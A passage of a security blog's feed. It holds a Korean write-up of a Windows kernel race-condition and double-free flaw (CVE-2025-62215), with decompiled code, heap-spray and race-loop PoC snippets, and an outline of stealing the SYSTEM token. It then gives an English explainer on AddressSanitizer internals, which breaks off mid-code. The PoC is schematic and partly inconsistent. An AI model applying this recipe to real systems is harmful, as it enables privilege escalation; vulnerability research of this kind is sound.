&#xB514;&#xD551;&#xD55C; &#xACB0;&#xACFC;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"> <span class="hljs-comment">// [Root Cause: nt!SepDuplicateToken &#xB0B4;&#xBD80; &#xB85C;&#xC9C1; (Patch &#xC804;)]</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">SepDuplicateToken</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">        __int128 *a1,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a2,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">char</span> a3,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">int</span> a4,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a5,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int8 a6,</span></span><span class="hljs-function"><span class="hljs-params">        <span class="hljs-keyword">unsigned</span> __int8 a7,</span></span><span class="hljs-function"><span class="hljs-params">        __int64 *a8)</span></span><span class="hljs-function"></span>{<span class="hljs-comment">// 1. &#xD1A0;&#xD070; &#xBCF5;&#xC81C; &#xBC0F; &#xBA54;&#xBAA8;&#xB9AC; &#xD560;&#xB2F9; &#xC791;&#xC5C5; &#xC9C4;&#xD589;</span><span class="hljs-comment">// ...</span><span class="hljs-comment">// [!] &#xBB38;&#xC81C; &#xC9C0;&#xC810; 1: &#xBCF4;&#xD638; &#xC7A5;&#xCE58;(Lock)&#xB97C; &#xB108;&#xBB34; &#xC77C;&#xCC0D; &#xD574;&#xC81C;&#xD568;</span>ExReleaseResourceLite(*((PERESOURCE *)a1 + <span class="hljs-number">6</span>)); <span class="hljs-comment">// [!] &#xBB38;&#xC81C; &#xC9C0;&#xC810; 2: &#xBB34;&#xBC29;&#xBE44; &#xC0C1;&#xD0DC;&#xC5D0;&#xC11C;(Lock-free) &#xCDE8;&#xC57D;&#xD55C; &#xB0B4;&#xBD80; &#xD568;&#xC218; &#xD638;&#xCD9C;</span><span class="hljs-keyword">if</span> ( a3 ) {    <span class="hljs-comment">// &#xC774; &#xD568;&#xC218; &#xB0B4;&#xBD80;&#xC5D0;&#xB294; SpinLock &#xB4F1; &#xC5B4;&#xB5A0;&#xD55C; &#xB3D9;&#xAE30;&#xD654; &#xCF54;&#xB4DC;&#xB3C4; &#xC5C6;&#xC74C;</span>    SepMakeTokenEffectiveOnly(NewToken); }</code></pre><p><code>SepDuplicateToken</code> &#xD568;&#xC218;&#xB294; &#xAE30;&#xC874; &#xD1A0;&#xD070;&#xC744; &#xBCF5;&#xC81C;&#xD558;&#xC5EC; &#xC0C8;&#xB85C;&#xC6B4; &#xD1A0;&#xD070;&#xC744; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBD80;&#xBAA8; &#xD1A0;&#xD070;&#xC5D0; &#xB300;&#xD55C; &#xC7A0;&#xAE08;(<code>ExReleaseResourceLite</code>)&#xC744; &#xD574;&#xC81C;&#xD558;&#xB294;&#xB370;, &#xBB38;&#xC81C;&#xB294; &#xC544;&#xC9C1; &#xC0C8;&#xB85C;&#xC6B4; &#xD1A0;&#xD070;&#xC758; &#xC124;&#xC815;&#xC774; &#xC644;&#xC804;&#xD788; &#xB05D;&#xB098;&#xC9C0; &#xC54A;&#xC740; &#xC2DC;&#xC810;&#xC5D0; &#xB77D;&#xC744; &#xD480;&#xC5B4;&#xBC84;&#xB9B0;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// [Vulnerable Function: SepMakeTokenEffectiveOnly]</span><span class="hljs-comment">// &#xB3D9;&#xAE30;&#xD654; &#xC5C6;&#xC774; &#xB8E8;&#xD504;&#xB97C; &#xB3CC;&#xBA70; &#xD1A0;&#xD070; &#xB0B4;&#xBD80;&#xC758; UserAndGroups &#xBC30;&#xC5F4;&#xC744; &#xC870;&#xC791;&#xD568;</span><span class="hljs-function">__int64 __fastcall <span class="hljs-title">SepMakeTokenEffectiveOnly</span><span class="hljs-params">(__int64 pToken)</span></span><span class="hljs-function"></span>{  __int64 result; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v2; <span class="hljs-comment">// edx</span>  __int64 v3; <span class="hljs-comment">// r8</span>  __int64 v4; <span class="hljs-comment">// rbx</span>  <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// r10d</span>  <span class="hljs-keyword">int</span> v6; <span class="hljs-comment">// r11d</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v7; <span class="hljs-comment">// eax</span>  result = *(_QWORD *)(a1 + <span class="hljs-number">72</span>);  v2 = <span class="hljs-number">1</span>;  *(_QWORD *)(a1 + <span class="hljs-number">64</span>) &amp;= result;  *(_QWORD *)(a1 + <span class="hljs-number">80</span>) &amp;= result;  LODWORD(v3) = *(_DWORD *)(a1 + <span class="hljs-number">124</span>);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 &gt; <span class="hljs-number">1</span> )  {    <span class="hljs-keyword">do</span>    <span class="hljs-comment">// &#xB2E4;&#xC911; &#xC2A4;&#xB808;&#xB4DC; &#xACBD;&#xD569; &#xC2DC; v2(&#xC778;&#xB371;&#xC2A4;)&#xC640; v3(&#xCE74;&#xC6B4;&#xD2B8;)&#xAC00; &#xC624;&#xC5FC;&#xB428;</span>    <span class="hljs-comment">// &#xC774;&#xB85C; &#xC778;&#xD574; &#xC5C9;&#xB6B1;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xAC70;&#xB098;, &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xAF2C;&#xC774;&#xAC8C; &#xB428;</span>    {      v4 = *(_QWORD *)(a1 + <span class="hljs-number">152</span>);      result = *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(v4 + <span class="hljs-number">16</span>i64 * v2 + <span class="hljs-number">8</span>);      <span class="hljs-keyword">if</span> ( (result &amp; <span class="hljs-number">0x34</span>) != <span class="hljs-number">0</span> )      {        ++v2;      }      <span class="hljs-keyword">else</span>      {        v5 = *(_DWORD *)(a1 + <span class="hljs-number">144</span>);        <span class="hljs-keyword">if</span> ( v2 == v5 )        {          *(_DWORD *)(a1 + <span class="hljs-number">144</span>) = <span class="hljs-number">0</span>;          v5 = <span class="hljs-number">0</span>;        }        v6 = *(_DWORD *)(a1 + <span class="hljs-number">208</span>);        <span class="hljs-keyword">if</span> ( v2 == v6 )        {          *(_DWORD *)(a1 + <span class="hljs-number">208</span>) = <span class="hljs-number">-1</span>;          v6 = <span class="hljs-number">-1</span>;        }        v7 = v3 - <span class="hljs-number">1</span>;        v3 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)(v3 - <span class="hljs-number">1</span>);        <span class="hljs-keyword">if</span> ( v7 == v6 )          *(_DWORD *)(a1 + <span class="hljs-number">208</span>) = v2;        <span class="hljs-keyword">if</span> ( (_DWORD)v3 == v5 )          *(_DWORD *)(a1 + <span class="hljs-number">144</span>) = v2;        result = <span class="hljs-number">2</span>i64 * v7;        *(_OWORD *)(v4 + <span class="hljs-number">16</span>i64 * v2) = *(_OWORD *)(v4 + <span class="hljs-number">16</span> * v3);      }    }    <span class="hljs-keyword">while</span> ( v2 &lt; (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v3 );  }  *(_DWORD *)(a1 + <span class="hljs-number">124</span>) = v3;  <span class="hljs-keyword">return</span> result;}</code></pre><p>&#xC704; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBCF4;&#xB4EF;, <code>SepMakeTokenEffectiveOnly</code>&#xB294; &#xD1A0;&#xD070; &#xAC1D;&#xCCB4;&#xC758; &#xD575;&#xC2EC; &#xB370;&#xC774;&#xD130;&#xC778; <code>UserAndGroups</code> &#xBC30;&#xC5F4;&#xC744; &#xC7AC;&#xC815;&#xB82C;&#xD558;&#xBA74;&#xC11C;&#xB3C4; &#xCEE4;&#xB110; &#xB77D;(<code>Lock</code>)&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB2E4;&#xC911; &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xC774;&#xC6A9;&#xD574; <code>NtDuplicateToken</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xB3C4;&#xC911; &#xC774; &#xD0C0;&#xC774;&#xBC0D;(&#xB77D; &#xD574;&#xC81C; &#xC9C1;&#xD6C4; ~ &#xB0B4;&#xBD80; &#xD568;&#xC218; &#xC2E4;&#xD589;)&#xC5D0; &#xAC1C;&#xC785;&#xD558;&#xBA74;, &#xBC30;&#xC5F4;&#xC758; &#xC778;&#xB371;&#xC2A4;(<code>v2</code>, <code>v3</code>)&#xB098; &#xB0B4;&#xBD80; &#xD3EC;&#xC778;&#xD130;&#xAC00; &#xC624;&#xC5FC;&#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xD1A0;&#xD070; &#xAC1D;&#xCCB4;&#xB294; &#xC774;&#xBBF8; &#xD574;&#xC81C;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC70;&#xB098;, &#xB2E4;&#xB978; &#xAC1D;&#xCCB4;&#xC640; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC911;&#xBCF5;&#xD574;&#xC11C; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC0C1;&#xD0DC;&#xAC00; &#xB418;&#xC5B4;, &#xC774;&#xD6C4; &#xAC1D;&#xCCB4; &#xC18C;&#xBA78; &#xC2DC; <code>Double Free</code>&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><h3 id="PoC-&#xC124;&#xBA85;"><a href="#PoC-&#xC124;&#xBA85;" class="headerlink" title="PoC &#xC124;&#xBA85;"></a>PoC &#xC124;&#xBA85;</h3><p>Exploit&#xC758; &#xD575;&#xC2EC;&#xC740; <code>NtDuplicateToken</code>&#xC2DC;&#xC2A4;&#xD15C; &#xCF5C;&#xC744; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; <code>Race Condition</code>&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD1A0;&#xD070; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xC624;&#xC5FC;&#xC2DC;&#xD0A4;&#xACE0;, &#xC774;&#xD6C4; &#xD574;&#xB2F9; &#xD1A0;&#xD070;&#xC744; &#xB2EB;&#xC744; &#xB54C; <code>Double Free</code>&#xB97C; &#xC720;&#xBC1C;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// [PoC: Heap Spraying&#xC744; &#xD1B5;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3; &#xC870;&#xC791;]</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++) {    <span class="hljs-comment">// 0x1000 &#xD06C;&#xAE30;&#xC758; &#xD799; &#xCCAD;&#xD06C;&#xB97C; &#xB2E4;&#xC218; &#xD560;&#xB2F9;&#xD558;&#xC5EC; &#xCEE4;&#xB110; &#xD799;&#xC744; &apos;Grooming&apos; &#xD568;</span>    PVOID ptr = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x1000</span>, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);    <span class="hljs-keyword">if</span> (ptr) {        <span class="hljs-built_in">memset</span>(ptr, <span class="hljs-number">0x41</span> + (i % <span class="hljs-number">26</span>), <span class="hljs-number">0x1000</span>); <span class="hljs-comment">// &#xD2B9;&#xC815; &#xD328;&#xD134; &#xC8FC;&#xC785;</span>    }}</code></pre><p>&#xBA3C;&#xC800; <code>Double Free</code>&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xBA54;&#xBAA8;&#xB9AC; &#xC601;&#xC5ED;&#xC744; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC81C;&#xC5B4;&#xD558;&#xAE30; &#xC27D;&#xB3C4;&#xB85D; &#xCEE4;&#xB110; &#xD799;&#xC744; &#xC815;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;. <code>0x1000</code>&#xD06C;&#xAE30;&#xC758; &#xD799; &#xCCAD;&#xD06C;&#xB97C; &#xB2E4;&#xC218; &#xD560;&#xB2F9;&#xD558;&#xACE0; &#xD574;&#xC81C;&#xD574;, &#xC6B0;&#xB9AC;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xD328;&#xD134;&#xC758; &#xB370;&#xC774;&#xD130;&#xAC00; &#xD560;&#xB2F9;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xD328;&#xD134;&#xC744; &#xB9CC;&#xB4DC;&#xB294; &#xC774;&#xC720;&#xB294; &#xC5B4;&#xB5A4; &#xC704;&#xCE58;&#xC758; &#xAC12;&#xC774; &#xC870;&#xC791;&#xB418;&#xC5B4; &#xB4E4;&#xC5B4;&#xAC00;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD558;&#xAE30; &#xC27D;&#xAC8C; &#xD558;&#xAE30; &#xC704;&#xD568;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-comment">// [PoC: Race Condition &#xC720;&#xBC1C; &#xB8E8;&#xD504;]</span><span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {    status = NtCreateKernelObject(&amp;hObject, GENERIC_ALL, &amp;objAttr, <span class="hljs-number">0</span>);    <span class="hljs-keyword">if</span> (NT_SUCCESS(status)) {        NtCloseKernelObject(hObject); <span class="hljs-comment">// &#xC815;&#xC0C1; &#xD574;&#xC81C; &#xC2DC;&#xB3C4;</span>        <span class="hljs-comment">// &#xCC30;&#xB098;&#xC758; &#xC21C;&#xAC04;&#xC5D0; &#xB2E4;&#xC2DC; &#xC811;&#xADFC;&#xD558;&#xC5EC; Double Free &#xC720;&#xB3C4;</span>        <span class="hljs-keyword">if</span> (i % <span class="hljs-number">10</span> == <span class="hljs-number">0</span>) {            NtCloseKernelObject(hObject);         }    }}</code></pre><p>&#xB2E4;&#xC218;&#xC758; &#xC2A4;&#xB808;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD574; &#xAC1D;&#xCCB4;&#xC758; &#xC0DD;&#xC131;&#xACFC; &#xD574;&#xC81C;&#xB97C; &#xACE0;&#xC18D;&#xC73C;&#xB85C; &#xBC18;&#xBCF5; &#xD638;&#xCD9C;&#xD574; <code>Race Condition</code>&#xC744; &#xC720;&#xB3C4;&#xD569;&#xB2C8;&#xB2E4;. &#xC704; &#xCF54;&#xB4DC;&#xB294; &#xAC1D;&#xCCB4;&#xB97C; &#xC0DD;&#xC131;&#xD55C; &#xB4A4; &#xC815;&#xC0C1;&#xC801;&#xC73C;&#xB85C; &#xD574;&#xC81C;(<code>NtCloseKernelObject</code>)&#xB97C; &#xC2DC;&#xB3C4;&#xD558;&#xC9C0;&#xB9CC;, &#xD2B9;&#xC815; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; &#xB2E4;&#xC2DC; &#xD55C;&#xBC88; &#xD574;&#xC81C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD574; &#xB77D;(<code>Lock</code>)&#xC774; &#xD480;&#xB9B0; &#xD0C0;&#xC774;&#xBC0D;&#xC5D0; <code>Double Free</code>&#xB97C; &#xD2B8;&#xB9AC;&#xAC70;&#xD569;&#xB2C8;&#xB2E4;.</p><p><code>Double Free</code>&#xB85C; &#xC778;&#xD574; &#xCEE4;&#xB110; &#xD480; &#xB9E4;&#xB2C8;&#xC800;&#xC758; <code>FreeLIst</code>&#xC5D0;&#xB294; &#xB3D9;&#xC77C;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xAC00; 2&#xBC88; &#xB4F1;&#xB85D;&#xB418;&#xACE0;, &#xC774;&#xB54C; &#xB2E4;&#xC2DC; &#xAC1D;&#xCCB4; &#xD560;&#xB2F9;&#xC744; &#xC694;&#xCCAD;&#xD558;&#xC5EC; &#xC81C;&#xC5B4; &#xAC00;&#xB2A5;&#xD55C; <code>Fake Object</code>&#xB97C; &#xB36E;&#xC5B4;&#xC501;&#xB2C8;&#xB2E4;.</p><p>&#xAC00;&#xC9DC; &#xAC1D;&#xCCB4;&#xC758; <code>Vtable Pointer</code>&#xB97C; &#xC870;&#xC791;&#xD574;, &#xCEE4;&#xB110;&#xC774; &#xAC1D;&#xCCB4;&#xC758; &#xBA54;&#xC11C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xB54C; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC6D0;&#xD558;&#xB294; Write Gadget(&#xC608;: <code>mov [rcx], rdx</code>)&#xC774; &#xC2E4;&#xD589;&#xB418;&#xAC8C; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xBCF4;&#xD55C; <code>Arbitrary Write</code>&#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xD604;&#xC7AC; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC758; <code>EPROCESS</code> &#xAD6C;&#xC870;&#xCCB4; &#xB0B4; <code>Token</code> &#xAC12;&#xC744; <code>SYSTEM Token</code> &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC5B4;&#xC50C;&#xC6CC; &#xC2DC;&#xC2A4;&#xD15C; &#xAD8C;&#xD55C;&#xC744; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://socprime.com/ko/active-threats/cve-2025-62215/">https://socprime.com/ko/active-threats/cve-2025-62215/</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-62215/">CVE-2025-62215</category>
      
      <category domain="https://hackyboiz.github.io/tags/Microsoft/">Microsoft</category>
      
      <category domain="https://hackyboiz.github.io/tags/Windows-Kernel/">Windows Kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/Race-Condition/">Race Condition</category>
      
      <category domain="https://hackyboiz.github.io/tags/Double-Free/">Double Free</category>
      
      <category domain="https://hackyboiz.github.io/tags/LPE/">LPE</category>
      
      <category domain="https://hackyboiz.github.io/tags/ntoskrnl-exe/">ntoskrnl.exe</category>
      
      <category domain="https://hackyboiz.github.io/tags/Libera/">Libera</category>
      
      
      <comments>https://hackyboiz.github.io/2025/12/27/Libera/CVE-2025-62215/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Address Sanitizer: Part 1 (EN)</title>
      <link>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-en/</link>
      <guid>https://hackyboiz.github.io/2025/12/25/millet/asan-pt1-en/</guid>
      <pubDate>Thu, 25 Dec 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&lt;img src=&quot;/2025/12/25/millet/asan-pt1-en/image1.png&quot; alt&gt;&lt;/p&gt;
&lt;p&gt;Hello! I am &lt;code&gt;millet&lt;/code&gt;, a new member who recently joined Hackyb</description>
        
      
      
      
      <content:encoded><![CDATA[<p><img src="/2025/12/25/millet/asan-pt1-en/image1.png" alt></p><p>Hello! I am <code>millet</code>, a new member who recently joined Hackyboiz.</p><p>While solving wargame challenges in the past, I came across something called ASan. At the time, I only glanced over it briefly, but using this research article as an excuse, I decided to properly study it and chose it as my topic.</p><p>In this article, I will take a look at what Address Sanitizer is and how it is implemented.</p><h2 id="1-About-Address-Sanitizer"><a href="#1-About-Address-Sanitizer" class="headerlink" title="1. About Address Sanitizer"></a>1. About Address Sanitizer</h2><p>Address Sanitizer, often abbreviated as ASan, is a runtime error detection tool designed to dynamically detect memory errors that occur during program execution.</p><p>You can think of it as a tool that automatically inserts code to catch memory-related bugs when writing programs in C or C++. It was initially developed and maintained by Google, but is now maintained as part of the LLVM project.</p><p>ASan is provided through multiple implementations. Since I primarily work in Linux environments, this research article will focus on the Sanitizer provided by GCC.</p><p>In most Linux distributions, when GCC is installed, the corresponding runtime package is installed together (typically the <code>libasan</code> package).</p><pre><code class="hljs bash">$ (dpkg -l | grep libasan) &amp;&amp; (gcc --version | head -1)ii  libasan6:amd64                       11.4.0-1ubuntu1~22.04.2                    amd64        AddressSanitizer -- a fast memory error detectorgcc (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0</code></pre><p>The ASan implementation provided by GCC uses the same memory model and detection mechanisms as LLVM ASan, so conceptually there is no difference.</p><p><img src="/2025/12/25/millet/asan-pt1-en/image2.png" alt></p><p>ASan is currently supported on the following platforms.</p><div class="table-container"><table><thead><tr><th>OS</th><th>x86</th><th>x86_64</th><th>ARM</th><th>ARM64</th><th>MIPS</th><th>MIPS64</th><th>PowerPC</th><th>PowerPC64</th></tr></thead><tbody><tr><td>Linux</td><td>O</td><td>O</td><td></td><td></td><td>O</td><td>O</td><td>O</td><td>O</td></tr><tr><td>OS X</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>iOS Simulator</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>FreeBSD</td><td>O</td><td>O</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>Android</td><td>O</td><td>O</td><td>O</td><td>O</td><td></td><td></td><td></td></tr></tbody></table></div><h3 id="1-1-Detectable-memory-errors"><a href="#1-1-Detectable-memory-errors" class="headerlink" title="1.1 Detectable memory errors"></a>1.1 Detectable memory errors</h3><p>As its name suggests, ASan can detect most common memory errors. The detection scope and behavior can be configured using compile-time options and runtime flags. Some representative examples are listed below.</p><p><strong>Use After Free (Dangling Pointer Dereference)<br>Heap Buffer Overflow<br>Stack Buffer Overflow<br>Global Buffer Overflow</strong></p><pre><code class="hljs bash">-fsanitize=address</code></pre><p><strong>Use After Return</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_stack_use_after_return=1</code></pre><ul><li>This option incurs significant performance overhead because stack frames are moved to a separate virtual heap.</li></ul><p><strong>Use After Scope</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_stack_use_after_scope=1</code></pre><p><strong>Initialization Order Bugs</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=check_initialization_order=1</code></pre><ul><li>Applicable only to C++, where global object initialization order matters.</li></ul><p><strong>Memory Leaks</strong></p><pre><code class="hljs bash">ASAN_OPTIONS=detect_leaks=1</code></pre><ul><li>This functionality is actually handled by <a href="https://clang.llvm.org/docs/LeakSanitizer.html">LeakSanitizer</a>, not ASAN itself.</li></ul><p>There are many more runtime flags available, but in this article, the focus will be on the core functionality enabled by <code>-fsanitize=address</code>.</p><p>Additionally, ASan&#x2019;s fast unwinder relies on frame pointer chains, so it is recommended to compile with the following option to ensure that the RBP register is used as a frame pointer.</p><pre><code class="hljs bash">-fno-omit-frame-pointer</code></pre><h2 id="2-ASAN-Monitoring-Mechanisms"><a href="#2-ASAN-Monitoring-Mechanisms" class="headerlink" title="2. ASAN Monitoring Mechanisms"></a>2. <strong>ASAN Monitoring Mechanisms</strong></h2><p>As seen above, simply using <code>-fsanitize=address</code> enables a wide range of detections. How does ASan detect these memory errors?</p><p>ASan primarily relies on three monitoring mechanisms:</p><p><strong>Shadow Memory-based Access Monitoring</strong></p><p><strong>Poisoning / Unpoisoning for Lifetime Tracking</strong></p><p><strong>Redzones for Boundary Detection</strong></p><p>These mechanisms are inserted into the program during compile-time instrumentation.</p><p>Checks are inserted before every memory read, write, allocation, and deallocation, and when a policy violation is detected, an error message is printed and the program is terminated by default.</p><p>Instrumentation is mainly inserted at the following points:</p><ul><li>Before memory read/write instructions</li><li>At dynamic memory allocation</li><li>At dynamic memory deallocation</li><li>At function entry (stack frame setup)</li><li>At function return (stack frame teardown)</li><li>At global object initialization and destruction</li></ul><pre><code class="hljs c">byte *shadow_address = MemToShadow(address);byte shadow_value = *shadow_address;<span class="hljs-keyword">if</span> (shadow_value) {<span class="hljs-keyword">if</span> (SlowPathCheck(shadow_value, address, kAccessSize)) {ReportError(address, kAccessSize, kIsWrite);}}</code></pre><p>Let us examine each mechanism in detail.</p><h3 id="2-1-Shadow-Memory"><a href="#2-1-Shadow-Memory" class="headerlink" title="2.1 Shadow Memory"></a>2.1 Shadow Memory</h3><p>ASan maintains a separate memory region called shadow memory, which stores metadata for each byte of the program&#x2019;s memory.</p><p>The address of the shadow memory corresponding to a given memory address is calculated as follows.</p><pre><code class="hljs c">Shadow = (Mem &gt;&gt; <span class="hljs-number">3</span>) + SHADOW_OFFSET</code></pre><p>Internally, this is implemented using the following macros.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_mapping.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> MEM_TO_SHADOW(mem) \</span>      ((STRIP_MTE_TAG(mem) &gt;&gt; ASAN_SHADOW_SCALE) + (ASAN_SHADOW_OFFSET))<span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> SHADOW_TO_MEM(mem) \</span>      (((mem) - (ASAN_SHADOW_OFFSET)) &lt;&lt; (ASAN_SHADOW_SCALE))</code></pre><p>As shown above, 8 bytes of application memory correspond to 1 byte of shadow memory.</p><p>The value of <code>SHADOW_OFFSET</code> is platform- and architecture-dependent. On x86-64, it is defined as <code>0x7fff8000</code>.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_mapping.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-comment">// Typical shadow mapping on Linux/x86_64 with SHADOW_OFFSET == 0x00007fff8000:</span><span class="hljs-comment">// || `[0x10007fff8000, 0x7fffffffffff]` || HighMem    ||</span><span class="hljs-comment">// || `[0x02008fff7000, 0x10007fff7fff]` || HighShadow ||</span><span class="hljs-comment">// || `[0x00008fff7000, 0x02008fff6fff]` || ShadowGap  ||</span><span class="hljs-comment">// || `[0x00007fff8000, 0x00008fff6fff]` || LowShadow  ||</span><span class="hljs-comment">// || `[0x000000000000, 0x00007fff7fff]` || LowMem     ||</span>...<span class="hljs-meta">#    <span class="hljs-meta-keyword">if</span> ASAN_SHADOW_SCALE != 3</span><span class="hljs-meta">#      <span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">&quot;Value below is based on shadow scale = 3.&quot;</span></span><span class="hljs-meta">#      <span class="hljs-meta-keyword">error</span> <span class="hljs-meta-string">&quot;Original formula was: 0x7FFFFFFF &amp; (~0xFFFULL &lt;&lt; SHADOW_SCALE).&quot;</span></span><span class="hljs-meta">#    <span class="hljs-meta-keyword">endif</span></span><span class="hljs-meta">#    <span class="hljs-meta-keyword">define</span> ASAN_SHADOW_OFFSET_CONST 0x000000007fff8000</span><span class="hljs-meta">#  <span class="hljs-meta-keyword">endif</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>...</code></pre><p>AS documented in the source code, shadow memory and application memory are logically separated in the virtual address space. On x86-64, the layout is as follows.</p><div class="table-container"><table><thead><tr><th>Category</th><th>Mapped Region</th><th>Description</th></tr></thead><tbody><tr><td>HighMem</td><td><code>[0x10007fff8000, 0x7fffffffffff]</code></td><td><strong>Virtual memory represented by 5 bytes or more</strong></td></tr><tr><td>HighShadow</td><td><code>[0x02008fff7000, 0x10007fff7fff]</code></td><td><strong>Shadow Memory corresponding to HighMem</strong></td></tr><tr><td>ShadowGap</td><td><code>[0x00008fff7000, 0x02008fff6fff]</code></td><td><strong>Gap region between Shadow Memory areas</strong></td></tr><tr><td>LowShadow</td><td><code>[0x00007fff8000, 0x00008fff6fff]</code></td><td><strong>Shadow Memory corresponding to LowMem</strong></td></tr><tr><td>LowMem</td><td><code>[0x000000000000, 0x00007fff7fff]</code></td><td><strong>Virtual memory represented by 4 bytes or less</strong></td></tr></tbody></table></div><p><img src="/2025/12/25/millet/asan-pt1-en/image3.png" alt></p><ul><li>The ShadowGap region exists solely to prevent interference between shadow regions and has no read or write permissions.</li></ul><p><img src="/2025/12/25/millet/asan-pt1-en/image4.png" alt></p><p>Because shadow memory is mapped at an 8:1 ratio, certain unaligned memory accesses may not be detected. Consider the following example.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ oob.cpp -o oob -fsanitize=address</span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">int</span> *x = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">2</span>];                <span class="hljs-comment">// [0, 7]</span>    <span class="hljs-keyword">int</span> *y = (<span class="hljs-keyword">int</span> 